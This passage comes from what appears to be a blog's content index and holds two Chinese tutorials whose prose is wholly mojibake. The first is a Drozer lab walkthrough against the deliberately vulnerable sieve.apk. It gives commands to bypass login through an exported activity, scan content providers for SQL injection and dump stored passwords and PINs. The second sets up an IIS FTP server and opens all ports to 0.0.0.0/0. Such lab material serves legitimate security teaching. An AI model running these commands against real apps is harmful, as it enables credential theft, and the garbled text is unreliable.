æ¨¡æ‹Ÿå™¨å®‰è£…sieve.apk\n> sieve.apkä¸ºå®˜ç½‘ç»™çš„æµ‹è¯•apkï¼Œä¸Šé¢è‡ªå¸¦å„ç§æ¼æ´ï¼Œåé¢çš„æ¡ˆä¾‹ä»¥sieve.apkä¸ºä¾‹æ¼”ç¤º\n\nå°†sieve.apkä¸‹è½½åï¼Œé€šè¿‡cmdå®‰è£…æˆ–è€…ç›´æ¥æ‹–è¿›æ¨¡æ‹Ÿå™¨è¿›è¡Œå®‰è£…\n\n```bash\nadb install å®‰è£…è·¯å¾„/sieve.apk\n```\n\n## 3.è¿æ¥mumuæ¨¡æ‹Ÿå™¨\n\næ‰“å¼€cmdè¿è¡Œ\n\n```bash\nadb connect 127.0.0.1:7555\n```\n\n![](https://i.loli.net/2020/03/23/rnxMjLdhG7XvFIQ.png)\n\n\n\n## 4.è¿›å…¥Drozeræ§åˆ¶å°\n\né¦–å…ˆè¦åœ¨mumuæ¨¡æ‹Ÿå™¨ä¸­æ‰“å¼€drozer-agent\n\n![](https://i.loli.net/2020/03/25/7rinHakSmXOCy1R.png)\n\nç„¶åä½¿ç”¨ adb è¿›è¡Œç«¯å£è½¬å‘ï¼Œè½¬å‘åˆ°ä¸Šè¾¹Drozerä½¿ç”¨çš„é»˜è®¤ç«¯å£` 31415`ï¼Œå¹¶è¿›å…¥Drozer æ§åˆ¶å°\n\n```bash\nadb forward tcp:31415 tcp:31415\n\ne:\ncd Appie/base  //è¿›å…¥drozerçš„å®‰è£…è·¯å¾„ä¸‹\ndrozer console connect\n```\n\n<img src=\"https://i.loli.net/2020/03/23/esFra6tB3mGWNxw.png\"  style=\"zoom: 50%;\" />\n\nçœ‹åˆ°å¦‚ä¸Šæ˜¾ç¤ºï¼Œè¯´æ˜å¯åŠ¨æˆåŠŸï¼Œä¸‹ä¸€æ­¥åˆ™å¯ä»¥è¿›è¡Œæµ‹è¯•\n\n## 5.é…ç½®Siveve\n\n> Sieveï¼šä¸€æ¬¾Androidå®‰å…¨æµ‹è¯•APP\n\nä¸ºäº†æˆ‘ä»¬åé¢çš„å®‰å…¨æ¡ˆä¾‹è®²è§£ï¼Œæˆ‘ä»¬éœ€è¦å…ˆé…ç½®Sieveã€‚\næ‰“å¼€sieveï¼Œç¬¬ä¸€æ¬¡è¿›å…¥éœ€è¦è¾“å…¥16ä½çš„å¯†ç ï¼Œæäº¤åéœ€è¦åˆ›å»º4ä½æ•°çš„PIN\nè®¾ç½®å¯†ç ï¼š1234567890123456\nPINï¼š1399\n\nè¿›å»åŠŸèƒ½ç•Œé¢ï¼Œæ·»åŠ æ–°çš„å¯†ç ï¼Œé‚®ç®±ï¼›ä¸»è¦æ˜¯ä¸ºäº†å¾€æ•°æ®åº“æ·»åŠ æ•°æ®ï¼Œæ–¹ä¾¿ä¹‹åçš„æ”»å‡»æ˜¾ç¤ºç»“æœ,ï¼Œéšä¾¿ä¹±å¡«å°±å¯ä»¥äº†ã€‚æˆ‘æ·»åŠ äº†ä¸€ä¸ªåä¸º`jwt`çš„ä¿¡æ¯\n\n![](https://i.loli.net/2020/03/25/mQ9vNdS4zGu5AhJ.png)\n\né…ç½®å¥½å°±å¯ä»¥å¼€å§‹å®‰å…¨æµ‹è¯•äº†\n\n## 6.Drozerä¹‹sieveå®‰å…¨æµ‹è¯•\n\n### 6.1åˆ—å‡ºå®‰è£…çš„æ‰€æœ‰åº”ç”¨åŒ…å\n\n```bash\ndz> run app.package.list\n```\n\n![](https://i.loli.net/2020/03/25/rgYaRcxUhIMVQp9.png)\n\n**ä¸­æ–‡ä¹±ç è§£å†³æ–¹æ³•ï¼š**\n\nä½¿ç”¨`run app.package.list`å‘½ä»¤å¯èƒ½ä¼šå‡ºç°ä¸­æ–‡ä¹±ç ï¼Œä¸‹é¢æ˜¯æˆ‘åœ¨ç½‘ä¸Šæ‰¾çš„è§£å†³åŠæ³•ï¼Œæ‰¾åˆ°ä¸‹å›¾è·¯å¾„ä¸‹æ–‡ä»¶è¿›è¡Œå¯¹åº”ä¿®æ”¹ï¼Œå°±å¯ä»¥äº†ã€‚äº²æµ‹æœ‰æ•ˆï¼\n\n![](https://i.loli.net/2020/03/25/WJugIejU8d79pyY.png)\n\n![](https://i.loli.net/2020/03/25/PiK4G1xgjIaeZlC.png)\n\n### 6.2åˆ©ç”¨å…³é”®è¯æœç´¢å¾—å‡ºåŒ…å\n\n> run app.package.list -f  å…³é”®å­—\n\n```bash\ndz> run app.package.list -f sieve\ncom.mwr.example.sieve\n```\n\n### 6.3æŸ¥çœ‹åŒ…çš„è¯¦ç»†ä¿¡æ¯\n\n```bash\ndz> run app.package.info -a  com.mwr.example.sieve\n```\n\n![](https://i.loli.net/2020/03/23/1LSyKnO64iDM5pt.png)\n\né€šè¿‡ä¸Šè¿°æ–¹å¼ï¼Œæˆ‘ä»¬å¯ä»¥è·å¾—åº”ç”¨æ•°æ®ç›®å½•ã€apkçš„è·¯å¾„ã€UIDã€GIDç­‰ä¿¡æ¯ã€‚\n\n### 6.4è¯†åˆ«æ”»å‡»é¢\n\n```\ndz> run app.package.attacksurface com.mwr.example.sieve \n```\n\n![](https://i.loli.net/2020/03/25/tEFABOVJl52P6va.png)\n\nè¿™é‡Œæˆ‘ä»¬å‘ç°æœ‰`3ä¸ªactivitiesï¼Œ0ä¸ªbroadcast receivers,2ä¸ªcontent providersï¼Œ2ä¸ªservices exported`æ˜¯å¯¼å‡ºçš„ï¼Œè¿™äº›éƒ½æ˜¯æ½œåœ¨é£é™©å…¥å£ã€‚\n\n#### activitiesç»„ä»¶\n\nåº”ç”¨ç¨‹åºä¸­ï¼Œä¸€ä¸ªActivityé€šå¸¸å°±æ˜¯ä¸€ä¸ªå•ç‹¬çš„ç•Œé¢ï¼Œå®ƒä¸Šé¢å¯ä»¥æ˜¾ç¤ºä¸€äº›æ§ä»¶ä¹Ÿå¯ä»¥ç›‘å¬å¹¶å¤„ç†ç”¨æˆ·çš„äº‹ä»¶åšå‡ºå“åº”ã€‚ Activityä¹‹é—´é€šè¿‡Intentè¿›è¡Œé€šä¿¡ã€‚åœ¨Intentçš„æè¿°ç»“æ„ä¸­ï¼Œæœ‰ä¸¤ä¸ªæœ€é‡è¦çš„éƒ¨åˆ†ï¼šåŠ¨ä½œå’ŒåŠ¨ä½œå¯¹åº”çš„æ•°æ®ã€‚\n\n#### broadcastç»„ä»¶\n\nBroadcastReceiveå¹¿æ’­æ¥æ”¶å™¨åº”ç”¨å¯ä»¥ä½¿ç”¨å®ƒå¯¹å¤–éƒ¨äº‹ä»¶è¿›è¡Œè¿‡æ»¤åªå¯¹æ„Ÿå…´è¶£çš„å¤–éƒ¨äº‹ä»¶(å¦‚å½“ç”µè¯å‘¼å…¥æ—¶ï¼Œæˆ–è€…æ•°æ®ç½‘ç»œå¯ç”¨æ—¶)è¿›è¡Œæ¥æ”¶å¹¶åšå‡ºå“åº”ã€‚å¹¿æ’­æ¥æ”¶å™¨æ²¡æœ‰ç”¨æˆ·ç•Œé¢ã€‚ç„¶è€Œï¼Œå®ƒä»¬å¯ä»¥å¯åŠ¨ä¸€ä¸ªactivityæˆ–serice æ¥å“åº”å®ƒä»¬æ”¶åˆ°çš„ä¿¡æ¯ï¼Œæˆ–è€…ç”¨NotificationManageræ¥é€šçŸ¥ç”¨æˆ·ã€‚é€šçŸ¥å¯ä»¥ç”¨å¾ˆå¤šç§æ–¹å¼æ¥å¸å¼•ç”¨æˆ·çš„æ³¨æ„åŠ›â”€â”€é—ªåŠ¨èƒŒç¯ã€éœ‡åŠ¨ã€æ’­æ”¾å£°éŸ³ç­‰ã€‚ä¸€èˆ¬æ¥è¯´æ˜¯åœ¨çŠ¶æ€æ ä¸Šæ”¾ä¸€ä¸ªæŒä¹…çš„å›¾æ ‡ï¼Œç”¨æˆ·å¯ä»¥æ‰“å¼€å®ƒå¹¶è·å–æ¶ˆæ¯ã€‚\n\n#### content ç»„ä»¶\n\nandroidå¹³å°æä¾›äº†Content Providerä½¿ä¸€ä¸ªåº”ç”¨ç¨‹åºçš„æŒ‡å®šæ•°æ®é›†æä¾›ç»™å…¶ä»–åº”ç”¨ç¨‹åºã€‚è¿™äº›æ•°æ®å¯ä»¥å­˜å‚¨åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­ã€åœ¨ä¸€ä¸ªSQLiteæ•°æ®åº“ã€æˆ–ä»¥ä»»ä½•å…¶ä»–åˆç†çš„æ–¹å¼ã€‚å…¶ä»–åº”ç”¨å¯ä»¥é€šè¿‡ContentResolverç±»ä»è¯¥å†…å®¹æä¾›è€…ä¸­è·å–æˆ–å­˜å…¥æ•°æ®ã€‚åªæœ‰éœ€è¦åœ¨å¤šä¸ªåº”ç”¨ç¨‹åºé—´å…±äº«æ•°æ®æ˜¯æ‰éœ€è¦å†…å®¹æä¾›è€…ã€‚\n\n#### servicesç»„ä»¶\n\nä¸€ä¸ªService æ˜¯ä¸€æ®µé•¿ç”Ÿå‘½å‘¨æœŸçš„ï¼Œæ²¡æœ‰ç”¨æˆ·ç•Œé¢çš„ç¨‹åºï¼Œå¯ä»¥ç”¨æ¥å¼€å‘å¦‚ç›‘æ§ç±»ç¨‹åºã€‚è¾ƒå¥½çš„ä¸€ä¸ªä¾‹å­å°±æ˜¯ä¸€ä¸ªæ­£åœ¨ä»æ’­æ”¾åˆ—è¡¨ä¸­æ’­æ”¾æ­Œæ›²çš„åª’ä½“æ’­æ”¾å™¨ã€‚åœ¨ä¸€ä¸ªåª’ä½“æ’­æ”¾å™¨çš„åº”ç”¨ä¸­ï¼Œåº”è¯¥ä¼šæœ‰å¤šä¸ªactivityï¼Œè®©ä½¿ç”¨è€…å¯ä»¥é€‰æ‹©æ­Œæ›²å¹¶æ’­æ”¾æ­Œæ›²ã€‚\n\n### 6.5æµ‹è¯•activities exported (ç»•è¿‡ç™»é™†éªŒè¯)\n\n```bash\ndz> run app.activity.info -a com.mwr.example.sieve \n//æ˜¾ç¤ºæš´éœ²çš„Activityä¿¡æ¯\n```\n![](https://i.loli.net/2020/03/25/VIjZwCiOTB6Qchp.png)\n\næ ¹æ®åç§°å¯ä»¥çŒœæµ‹å‡º`.FileSelectActivity`å¯èƒ½æ˜¯å’Œæ–‡ä»¶æœ‰å…³ï¼Œ`.MainLoginActivity`å°±æ˜¯ä¸»ç•Œé¢ï¼Œ`.PWList`å¯èƒ½å’Œå¯†ç æœ‰å…³ã€‚\n\næ­£å¸¸ä½¿ç”¨appéœ€è¦è¾“å…¥PINæˆ–è€…å¯†ç æ‰èƒ½è¿›å»ä¸»ç•Œé¢ï¼Œ\n\n![](https://i.loli.net/2020/03/25/UiW2CqJYlc3E4mG.png)\n\nä½†æ˜¯çœ‹åˆ°`FileSelectActivity`å’Œ`PWList`æ˜æ˜¾æ˜¯ç™»é™†è¿›å»åçš„ç•Œé¢ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ç›´æ¥è°ƒç”¨æ­¤ä¸¤ä¸ªactivityï¼Œä»è€Œç»•è¿‡ç™»é™†éªŒè¯ã€‚\n\n```bash\ndz> run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList     //è¯¥å‘½ä»¤ä¼šç”Ÿæˆä¸€ä¸ªåˆé€‚çš„intentæ¥å¯åŠ¨activity\n```\n\nè¿è¡Œä¹‹åå¯ä»¥ç›´æ¥è¿›å…¥åˆ°æˆ‘ä»¬ä¸€å¼€å§‹é…ç½®çš„æµ‹è¯•ä¿¡æ¯ç•Œé¢ï¼Œç»•è¿‡äº†ç™»å½•éªŒè¯\n\n![](https://i.loli.net/2020/03/25/4Yc1fHxKX5NZsSr.png)\n\n> è¶Šæƒæ¼æ´--ç»•è¿‡ç™»å½•ç•Œé¢å¯¼è‡´å¯ç›´æ¥è®¿é—®Your Passwordsç•Œé¢ï¼Œè¯´æ˜å­˜åœ¨è¶Šæƒæ¼æ´ã€‚\n\n### 6.6æµ‹è¯• content provider(æ•°æ®åº“æ³„éœ²ï¼Œsqlæ³¨å…¥ç­‰é—®é¢˜)\n\n```bash\ndz> run app.provider.info -a com.mwr.example.sieve     //åˆ—ä¸¾Content Providerçš„ä¿¡æ¯\n```\n\n![](https://i.loli.net/2020/04/01/DhrXCIodKA6U3uZ.png)\n\n```bash\ndz> run app.provider.finduri com.mwr.example.sieve     //æšä¸¾uri\n```\n\n![](https://i.loli.net/2020/04/01/a6VeIRUypDYiCzQ.png)\nåˆ—å‡ºäº†å¯è®¿é—®å†…å®¹URIçš„åˆ—è¡¨å’Œè·¯å¾„\n\n```bash\ndz> run scanner.provider.finduris -a com.mwr.example.sieve     //ä½¿ç”¨æ‰«æå™¨æšä¸¾uri\n```\n\n![](https://i.loli.net/2020/04/01/QfLMEex1olyTF2O.png)\n\n```bash\ndz> run scanner.provider.injection -a com.mwr.example.sieve     //æ£€æµ‹å¯åˆ©ç”¨uriï¼Œæ£€æŸ¥sqlæ³¨å…¥\n```\n\n![](https://i.loli.net/2020/04/01/OvqE4BKm1IRoV7A.png)\n\nå‘ç°ç¨‹åºä¸­å­˜åœ¨ä¸‰å¤„æ³¨å…¥\n\n```bash\ndz> run scanner.provider.sqltables -a  com.mwr.example.sieve //åˆ—å‡ºè¯¥appçš„è¡¨ä¿¡æ¯\n```\n\n![](https://i.loli.net/2020/04/01/adROPLf81oWsjnC.png)\n\n```bash\ndz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/     //è·å–æ•°æ®åº“æ•°æ®ï¼ˆå³ä¸ºä¹‹å‰ä¿å­˜çš„å¯†ç ï¼Œé‚®ç®±ä¿¡æ¯ï¼‰\n```\n\n![](https://i.loli.net/2020/04/01/p5lW2XtSJgCVAwG.png)\n\nè¯»å–åˆ°Passwordsè¡¨ä¸­çš„å†…å®¹ï¼Œå¯ä»¥çœ‹åˆ°ç”¨æˆ·åã€å¯†ç ã€é‚®ç®±ç­‰ä¿¡æ¯\n\n```bash\ndz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/ --vertical     //ç«–ç›´æ˜¾ç¤ºæ•°æ®åº“æ•°æ®passwordå’Œpinç \n```\n\n![](https://i.loli.net/2020/04/01/UbapG4iVgA3W8oh.png)\n\nè¯»å–åˆ°Keyè¡¨ä¸­çš„å†…å®¹,å¯ä»¥çœ‹åˆ°passwordå’Œpinç \n\n### 6.7åˆ©ç”¨å¹¿æ’­æ¥æ”¶å™¨\n\n```bash\nrun app.broadcast.info -a \nrun app.broadcast.send --component   --extra   \nrun app.broadcast.sniff --action \n```\n### 6.8å¼€å‘æœåŠ¡\n\n```bash\nrun app.service.info -a \nrun app.service.start --action  --component  \nrun app.service.send   --msg    --extra    --bundle-as-obj\n```\n\n\n\n\n\nå‚è€ƒï¼š[drozerä¹‹ç©è½¬sieve](https://blog.csdn.net/samlirongsheng/article/details/104926282)\nå‚è€ƒï¼š[å®‰å“å››å¤§ç»„ä»¶å®¡è®¡å®éªŒï¼ˆdrozerï¼‰ ](https://www.sohu.com/a/226017569_354899)\nå‚è€ƒï¼š[Androidå®‰å…¨æµ‹è¯•æ¡†æ¶Drozerï¼ˆä½¿ç”¨ç¯‡ï¼‰](https://www.jianshu.com/p/dfa92bab3a55)\nå‚è€ƒ:[drozer-Androidå®‰å…¨æµ‹è¯•åŸºæœ¬ä½¿ç”¨æ•™ç¨‹ï¼ˆWindows10ï¼‰](https://blog.csdn.net/jianglianye21/article/details/80667346)\nå‚è€ƒ:å®˜æ–¹æŒ‡å—ï¼ˆè‹±æ–‡ï¼‰[ Drozer ä½¿ç”¨æŒ‡å—](https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-drozer-user-guide-2015-03-23.pdf)\n\n","tags":["Android"],"categories":["Course"]},{"title":"FTPæœåŠ¡å™¨é…ç½®ä¸ç®¡ç†","url":"/posts/11968.html","content":"\n## ä¸€ã€ **å®éªŒç¯å¢ƒ**\n\n1. æ“ä½œç³»ç»Ÿï¼šWindowsç³»ç»Ÿã€é˜¿é‡Œäº‘Windows Server 2016\n2. å®éªŒè®¾å¤‡ï¼šPCæœº\n## äºŒã€ å®éªŒå†…å®¹\n\nä»»åŠ¡ 1ï¼šFTPæœåŠ¡å™¨çš„å®‰è£…\nä»»åŠ¡ 2ï¼šåˆ›å»ºFTPç«™ç‚¹\nä»»åŠ¡ 3ï¼šé…ç½®å®¢æˆ·ç«¯è®¿é—®FTPç«™ç‚¹\nä»»åŠ¡ 4ï¼šFTPè®¿é—®é…ç½®\n\n## ä¸‰ã€ å®éªŒæ­¥éª¤ä¸ç»“æœ\n\n### 1. FTPæœåŠ¡å™¨çš„å®‰è£…\n\ni.       æ‰“å¼€ã€æœåŠ¡å™¨ç®¡ç†å™¨ã€‘ï¼Œå•å‡»ã€æ·»åŠ è§’è‰²å’ŒåŠŸèƒ½ã€‘æŒ‰é’®ï¼Œè¿›å…¥ã€æ·»åŠ è§’è‰²å’ŒåŠŸèƒ½å‘å¯¼ã€‘ã€‚\nii.      å•å‡»ã€ä¸‹ä¸€æ­¥ã€‘æŒ‰é’®ï¼Œé€‰æ‹©ã€åŸºäºè§’è‰²æˆ–åŸºäºåŠŸèƒ½çš„å®‰è£…å•å‡»ã€ä¸‹ä¸€æ­¥ã€‘æŒ‰é’®ï¼Œé€‰æ‹©ã€ä»æœåŠ¡å™¨æ± ä¸­é€‰æ‹©æœåŠ¡å™¨ã€‘ï¼Œå®‰è£…ç¨‹åºä¼šè‡ªåŠ¨æ£€æµ‹ä¸æ˜¾ç¤ºè¿™å°è®¡ç®—æœºé‡‡ç”¨é™æ€IPåœ°å€è®¾ç½®çš„ç½‘ç»œè¿æ¥ã€‚\niii.      å•å‡»ã€ä¸‹ä¸€æ­¥ã€‘ï¼Œåœ¨ã€æœåŠ¡å™¨è§’è‰²ã€‘ä¸­ï¼Œé€‰æ‹©ã€WebæœåŠ¡å™¨ï¼ˆIISï¼‰ã€‘, è‡ªåŠ¨å¼¹å‡ºã€æ·»åŠ WebæœåŠ¡å™¨ï¼ˆIISï¼‰æ‰€éœ€çš„åŠŸèƒ½ã€‘å¯¹è¯æ¡†ï¼Œå•å‡»ã€æ·»åŠ åŠŸèƒ½ã€‘æŒ‰é’®ã€‚\niv.     å•å‡»ã€ä¸‹ä¸€æ­¥ã€‘æŒ‰é’®ï¼Œé€‰æ‹©éœ€è¦æ·»åŠ çš„åŠŸèƒ½ï¼Œå¦‚æ— ç‰¹æ®Šéœ€æ±‚ï¼Œä¸€èˆ¬é»˜è®¤å³å¯ã€‚\nv.      å•å‡»ã€ä¸‹ä¸€æ­¥ã€‘æŒ‰é’®ï¼Œåœ¨ã€æœåŠ¡å™¨è§’è‰²ã€‘ä¸­ï¼Œå‹¾é€‰ã€FTPæœåŠ¡å™¨ã€‘ã€‚\n<img src=\"https://i.loli.net/2020/03/21/StgI9R2dDKpVmNj.png\"/>\nvi.      å•å‡»ã€ä¸‹ä¸€æ­¥ã€‘æŒ‰é’®ï¼Œåœ¨ã€ç¡®è®¤ã€‘å¯¹è¯æ¡†ä¸­ï¼Œç¡®è®¤æ‰€éœ€å®‰è£…çš„è§’è‰²ã€è§’è‰²æœåŠ¡æˆ–åŠŸèƒ½ï¼Œå•å‡»ã€å®‰è£…ã€‘ã€‚å®‰è£…å®Œæˆåï¼Œå•å‡»ã€å…³é—­ã€‘æŒ‰é’®å®Œæˆå®‰è£…ã€‚\n\n<img src=\"https://i.loli.net/2020/03/21/tUmu4sh2GeZI3LQ.png\" />\n\n### 2. åˆ›å»ºFTPç«™ç‚¹\n\ni.      æ‰“å¼€ã€æœåŠ¡å™¨ç®¡ç†å™¨ã€‘ï¼Œå•å‡»ã€å·¥å…·ã€‘ï¼Œé€‰æ‹©ã€Internetä¿¡æ¯æœåŠ¡ï¼ˆIISï¼‰ç®¡ç†å™¨ã€‘ã€‚\nii.      å³é”®å•å‡»ã€ç½‘ç«™ã€‘ï¼Œé€‰æ‹©ã€æ·»åŠ FTPç«™ç‚¹ã€‘ã€‚\niii.      åœ¨ã€æ·»åŠ FTPç«™ç‚¹ã€‘å¯¹è¯æ¡†ä¸­ï¼Œè¾“å…¥FTPç«™ç‚¹çš„åç§°ï¼Œè®¾ç½®è¯¥ç«™ç‚¹æ‰€æä¾›æ–‡ä»¶çš„æœ¬åœ°æ‰€åœ¨ä½ç½®ï¼Œå•å‡»ã€ä¸‹ä¸€æ­¥ã€‘æŒ‰é’®ã€‚\n<img src=\"https://i.loli.net/2020/03/21/twbD613MfmJsC5j.png\"/>\niv.      è®¾ç½®FTPç«™ç‚¹çš„ç»‘å®šIPåœ°å€å’Œç«¯å£å·ï¼Œåœ¨SLLé€‰é¡¹ä¸­ï¼Œé€‰æ‹©ã€æ— SLLã€‘ï¼ˆFTPçš„æ•°æ®ä¼ è¾“æ˜¯æ˜æ–‡ä¼ è¾“ï¼Œå¦‚æœéœ€è¦åœ¨å®‰å…¨æ€§è¾ƒé«˜çš„ç¯å¢ƒä¸‹ä½¿ç”¨ï¼Œå¯ä»¥é€‰æ‹©ã€å…è®¸SLLã€‘å’Œã€éœ€è¦SSLã€‘ï¼‰ï¼Œå•å‡»ã€ä¸‹ä¸€æ­¥ã€‘æŒ‰é’®ã€‚\n<img src=\"https://i.loli.net/2020/03/21/NB7KAgzE9jmwYvS.png\"/>\nv.      è®¾ç½®FTPç«™ç‚¹çš„èº«ä»½éªŒè¯ã€æˆæƒå’Œæƒé™ã€‚åœ¨èº«ä»½éªŒè¯ä¸­ï¼Œå‹¾é€‰ã€åŸºæœ¬ã€‘ã€‚åœ¨æˆæƒä¸­ï¼Œé€‰æ‹©ã€æ‰€æœ‰ç”¨æˆ·ã€‘å‡å¯è®¿é—®ã€‚åœ¨æƒé™ä¸­ï¼Œå‹¾é€‰ã€è¯»å–ã€‘å’Œã€å†™å…¥ã€‘ä¸¤ä¸ªæƒé™ï¼Œå•å‡»ã€å®Œæˆã€‘æŒ‰é’®ã€‚\n<img src=\"https://i.loli.net/2020/03/21/vCBoniJNufUlZcH.png\"/>\nvi.      FTPç«™ç‚¹åˆ›å»ºæˆåŠŸã€‚\n<img src=\"https://i.loli.net/2020/03/21/K81px7b6dCh5OML.png\"/>\n\nåœ¨æµè§ˆå™¨æˆ–è€…åœ¨æ­¤ç”µè„‘åœ°å€æ¡†ä¸­è¾“å…¥`ftp://127.0.0.1`éƒ½å¯ä»¥æˆåŠŸè®¿é—®FTPæœåŠ¡å™¨\n\n![](https://i.loli.net/2020/03/22/noblh9EIYPGTRKO.png)\n\n![](https://i.loli.net/2020/03/22/HojKXOGYDWpfxzF.png)\n\næˆ‘ä»¬å‘ç°æˆ‘çš„FTPæœåŠ¡å™¨é‡Œé¢ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œæˆ‘ä»¬å¯ä»¥å‘æˆ‘è®¾å®šçš„é»˜è®¤FTPç‰©ç†è·¯å¾„`C:\\FTP`ä¸­æ·»åŠ æ–‡ä»¶ï¼Œä¾‹å¦‚æ·»åŠ ä¸€ä¸ªlogo.png\n![](https://i.loli.net/2020/03/22/J2NbdyCfWnVvQkA.png)\nç„¶åæˆ‘ä»¬å°±å¯ä»¥è®¿é—®åˆ°æ·»åŠ çš„å›¾ç‰‡äº†\n\n![](https://i.loli.net/2020/03/22/eYNclhtw6LXviua.png)\n\n### 3. é…ç½®å®¢æˆ·ç«¯è®¿é—®FTPç«™ç‚¹\n\n> ä¸Šé¢æˆ‘ä»¬å·²ç»å®ç°äº†åœ¨æœåŠ¡å™¨æœ¬åœ°è®¿é—®FTP,ç°åœ¨æˆ‘ä»¬æ¥å®ç°åœ¨å¤–ç½‘æ¡ä»¶ä¸‹æ¥è®¿é—®FTPæœåŠ¡å™¨\n\ni. è®¾ç½®å®‰å…¨ç»„åŠé˜²ç«å¢™ï¼Œæ‚¨éœ€è¦åœ¨å®ä¾‹å®‰å…¨ç»„çš„å…¥æ–¹å‘æ·»åŠ ä¸€æ¡æ”¾è¡ŒFTPç«¯å£çš„å®‰å…¨ç»„è§„åˆ™\n<img src=\"https://i.loli.net/2020/03/22/JY9TtZKg13hqXE2.png\"/>\né…ç½®ä¹‹åé€šè¿‡æµè§ˆå™¨æ— æ³•è®¿é—®FTPæœåŠ¡å™¨,æŸ¥è¯¢ä¹‹åå‘ç°ï¼Œå¤–ç½‘æ— æ³•è¿æ¥å’Œè®¿é—®Windowså®ä¾‹æ­å»ºçš„FTPï¼Œè¿™ç§æƒ…å†µå¯èƒ½æ˜¯ç”±äºä»¥ä¸‹ä¸¤ç§åŸå› å¯¼è‡´çš„ã€‚\n\n- [å®‰å…¨ç»„æ‹¦æˆªå¤–ç½‘è®¿é—®](https://help.aliyun.com/knowledge_detail/40914.html#wWHYT)\n- [é˜²ç«å¢™æ‹¦æˆªFTPè¿›ç¨‹](https://help.aliyun.com/knowledge_detail/40914.html#aWGNP)\n\nå¦‚æœæ­å»ºçš„FTPæœåŠ¡åœ¨å¤–ç½‘æ— æ³•è¿æ¥å’Œè®¿é—®ï¼Œè¯·å‚è€ƒå¦‚ä¸‹æ–‡æ¡£è¿›è¡Œæ’æŸ¥å¤„ç†ã€‚ [åœ¨å¤–ç½‘æ— æ³•è¿æ¥å’Œè®¿é—®Windowså®ä¾‹ä¸­çš„FTPæœåŠ¡](https://help.aliyun.com/document_detail/40914.html)\n\n**è§£å†³æ–¹æ³•ï¼š**åœ¨ æ·»åŠ å®‰å…¨ç»„è§„åˆ™ å¯¹è¯æ¡†ï¼Œåè®®ç±»å‹ é€‰æ‹© `å…¨éƒ¨`ï¼Œæˆæƒå¯¹è±¡ å¡«å†™ `0.0.0.0/0`\n<img src=\"https://i.loli.net/2020/03/22/G1mUhDE4nFHwtI9.png\" />\nç„¶åå°±å¯ä»¥é€šè¿‡æµè§ˆå™¨æ­£å¸¸è®¿é—®FTPæœåŠ¡å™¨äº†\n<img src=\"https://i.loli.net/2020/03/22/fwEoInbaVYp1Q3A.png\"/>\næˆ‘é€šè¿‡è®¡ç®—æœºçš„åœ°å€æ è®¿é—®ï¼ŒåˆæŠ¥å¦‚ä¸‹é”™è¯¯\n![](https://i.loli.net/2020/03/22/xlHW5CJMyFGqiOR.png)\nè§£å†³æ–¹æ³•ï¼šæ‰“å¼€IE æµè§ˆå™¨ -- å·¥å…· -- Internet é€‰é¡¹ -- é«˜çº§ -- è®¾ç½® -- æµè§ˆ -- æŠŠ ä½¿ç”¨è¢«åŠ¨FTP ï¼ˆç”¨äºé˜²ç«å¢™å’Œ DSL è°ƒåˆ¶è§£è°ƒå™¨çš„å…¼å®¹ï¼‰ å‰é¢çš„å‹¾å»æ‰.\nä¿®æ”¹ä¹‹åå°±å¯ä»¥æˆåŠŸè®¿é—®äº†\n![](https://i.loli.net/2020/03/22/TzponZCfH9l3qVr.png)\n\n\n\n###  4. FTPè®¿é—®é…ç½®\n\n#### 4.1 IPåœ°å€é™åˆ¶\n\næ‰“å¼€FTP IPåœ°å€é™åˆ¶å’ŒåŸŸé™åˆ¶\n![](https://i.loli.net/2020/03/24/k4sMOrf6LTbqhwS.png)\n\n\nç‚¹å‡»æ·»åŠ æ‹’ç»æ¡ç›®ï¼Œè¾“å…¥è¦é™å®šçš„IPåœ°å€\n\n![](https://i.loli.net/2020/03/24/A9P5e3rQbw4BpSZ.png)\nå®¢æˆ·ç«¯å†è®¿é—®FTPå°±å¼¹å‡ºç™»å½•æ¡†ï¼Œæ— æ³•å†è®¿é—®FTP,åˆ é™¤æ‹’ç»IPåˆå¯ä»¥ç»§ç»­è®¿é—®FTP\n\n<img src=\"https://i.loli.net/2020/03/24/5UnqGgCdVcKZh4E.png\"/>\n\n#### 4.2 èº«ä»½éªŒè¯\n\næ‰“å¼€FTPèº«ä»½éªŒè¯\n\n![](https://i.loli.net/2020/03/24/xinPTYCMsdNgu3Z.png)\n\nåŒ¿åèº«ä»½éªŒè¯å¼€å¯å¯ç›´æ¥è®¿é—®FTP,åŸºæœ¬èº«ä»½éªŒè¯å¼€å¯éœ€è¦è¾“å…¥ç®¡ç†å‘˜ç”¨æˆ·åå’Œå¯†ç \n\n![](https://i.loli.net/2020/03/24/pseAuZgRatKbUjO.png)\n\nå®é™…å·¥ä½œä¸­ä¸€èˆ¬ä¸ä¼šä½¿ç”¨ç®¡ç†è´¦å·æ¥è®¿é—®FTP,å› æ­¤æˆ‘ä»¬éœ€è¦æ·»åŠ ä¸€äº›ä¸“é—¨ç”¨äºFTPè®¿é—®çš„è´¦å·ï¼Œæ‰“å¼€è®¡ç®—æœºç®¡ç†åœ¨æœ¬åœ°ç”¨æˆ·å’Œç»„ä¸­æ–°å»ºç”¨æˆ·\n\n<img src=\"https://i.loli.net/2020/03/24/PqvuBgsOEbxMAFV.png\"/>\n\nè®¾ç½®ç”¨æˆ·åå’Œå¯†ç \n\n<img src=\"https://i.loli.net/2020/03/24/BgDoX1PispKeqwE.png\"/>\n\nè®¾ç½®æ–°å»ºç”¨æˆ·æ‰€åœ¨ç»„å¯¹FTPçš„è®¿é—®æƒé™\n\n<img src=\"https://i.loli.net/2020/03/24/9zBnQdYilA3aGq5.png\"/>\n\nåœ¨å®¢æˆ·ç«¯è¾“å…¥æ–°å»ºçš„ç”¨æˆ·çš„ä¿¡æ¯å°±å¯ä»¥æ­£å¸¸è®¿é—®FTPäº†\n\n<img src=\"https://i.loli.net/2020/03/24/82qocGQStIeuzFw.png\"/>\n\n#### 4.3 æˆæƒè§„åˆ™\n\næ‰“å¼€FTPæˆæƒè§„åˆ™ï¼Œç‚¹å‡»æ·»åŠ 